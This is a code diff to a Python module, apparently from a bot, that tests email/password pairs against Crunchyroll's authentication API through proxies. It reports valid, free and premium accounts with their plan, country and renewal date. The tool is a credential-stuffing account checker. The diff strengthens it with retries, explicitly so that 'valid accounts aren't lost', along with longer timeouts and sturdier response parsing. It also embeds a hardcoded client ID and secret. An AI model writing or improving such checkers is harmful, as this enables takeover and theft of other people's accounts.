@@ -15,6 +15,8 @@ from datetime import datetime
 from typing import Optional
 
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 from bot.utils.logger import setup_logger
 
@@ -23,6 +25,15 @@ log = setup_logger("mod.crunchyroll")
 # ── API constants (from CR.py) ──────────────────────────────────────────
 _CLIENT_ID = "o7uowy7q4lgltbavyhjq"
 _CLIENT_SECRET = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"
+
+# Retry on transient HTTP errors so valid accounts aren't lost.
+_RETRY = Retry(
+    total=2,
+    backoff_factor=0.5,
+    status_forcelist=[429, 500, 502, 503, 504],
+    allowed_methods=["GET", "POST"],
+    raise_on_status=False,
+)
 
 _COUNTRY_MAP = {
     "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽",
@@ -39,6 +50,15 @@ _COUNTRY_MAP = {
 }
 
 
+def _make_session() -> requests.Session:
+    """Create a Session with automatic retries on transient errors."""
+    session = requests.Session()
+    adapter = HTTPAdapter(max_retries=_RETRY)
+    session.mount("https://", adapter)
+    session.mount("http://", adapter)
+    return session
+
+
 # ── Synchronous check (mirrors CR.py exactly) ──────────────────────────
 
 def _check_sync(
@@ -51,7 +71,7 @@ def _check_sync(
     Returns a dict with hit details, a dict with ``free=True`` for free
     accounts, or ``None`` for bad credentials / errors.
     """
-    session = requests.Session()
+    session = _make_session()
     headers = {
         "User-Agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -72,30 +92,52 @@ def _check_sync(
         }
         r1 = session.post(
             "https://beta-api.crunchyroll.com/auth/v1/token",
-            data=data, headers=headers, proxies=proxy, timeout=10,
+            data=data, headers=headers, proxies=proxy, timeout=15,
         )
 
         if r1.status_code != 200:
             return None
 
-        auth = r1.json()
-        token = auth["access_token"]
-        pid = auth["profile_id"]
+        try:
+            auth = r1.json()
+        except (ValueError, KeyError):
+            return None
+        token = auth.get("access_token")
+        pid = auth.get("profile_id")
+        if not token:
+            return None
         headers["Authorization"] = f"Bearer {token}"
 
         # 2. ACCOUNT DETAILS
-        r2 = session.get(
+        r2_resp = session.get(
             "https://beta-api.crunchyroll.com/accounts/v1/me",
-            headers=headers, proxies=proxy, timeout=7,
-        ).json()
+            headers=headers, proxies=proxy, timeout=10,
+        )
+        if r2_resp.status_code != 200:
+            # Authenticated but can't get account details — treat as free.
+            return {"email": email, "password": password, "free": True}
+        try:
+            r2 = r2_resp.json()
+        except ValueError:
+            return {"email": email, "password": password, "free": True}
+
         ev = r2.get("email_verified", False)
         guid = r2.get("external_id")
 
         # 3. PLAN & COUNTRY
-        r3 = session.get(
+        if not guid:
+            return {"email": email, "password": password, "free": True}
+
+        r3_resp = session.get(
             f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{guid}/benefits",
-            headers=headers, proxies=proxy, timeout=7,
-        ).json()
+            headers=headers, proxies=proxy, timeout=10,
+        )
+        if r3_resp.status_code != 200:
+            return {"email": email, "password": password, "free": True}
+        try:
+            r3 = r3_resp.json()
+        except ValueError:
+            return {"email": email, "password": password, "free": True}
 
         if r3.get("total", 0) > 0:
             country_code = r3.get("subscription_country", "Unknown")
@@ -112,23 +154,32 @@ def _check_sync(
                 plan = "Premium"
 
             # 4. EXPIRY
-            r4 = session.get(
-                f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions",
-                headers=headers, proxies=proxy, timeout=7,
-            ).json()
-
             expiry = "N/A"
             remaining = "0"
-            if "nextRenewalDate" in str(r4):
-                for s in r4.get("subscriptions", []):
-                    if s.get("nextRenewalDate"):
-                        expiry = s["nextRenewalDate"].split("T")[0]
-                        try:
-                            d1 = datetime.strptime(expiry, "%Y-%m-%d")
-                            remaining = str((d1 - datetime.now()).days)
-                        except ValueError:
-                            pass
-                        break
+            if pid:
+                try:
+                    r4_resp = session.get(
+                        f"https://beta-api.crunchyroll.com/subs/v4/accounts/{pid}/subscriptions",
+                        headers=headers, proxies=proxy, timeout=10,
+                    )
+                    if r4_resp.status_code == 200:
+                        r4 = r4_resp.json()
+                        if "nextRenewalDate" in str(r4):
+                            for s in r4.get("subscriptions", []):
+                                if s.get("nextRenewalDate"):
+                                    expiry = s["nextRenewalDate"].split("T")[0]
+                                    try:
+                                        d1 = datetime.strptime(
+                                            expiry, "%Y-%m-%d"
+                                        )
+                                        remaining = str(
+                                            (d1 - datetime.now()).days
+                                        )
+                                    except ValueError:
+                                        pass
+                                    break
+                except Exception:
+                    pass
 
             return {
                 "email": email,
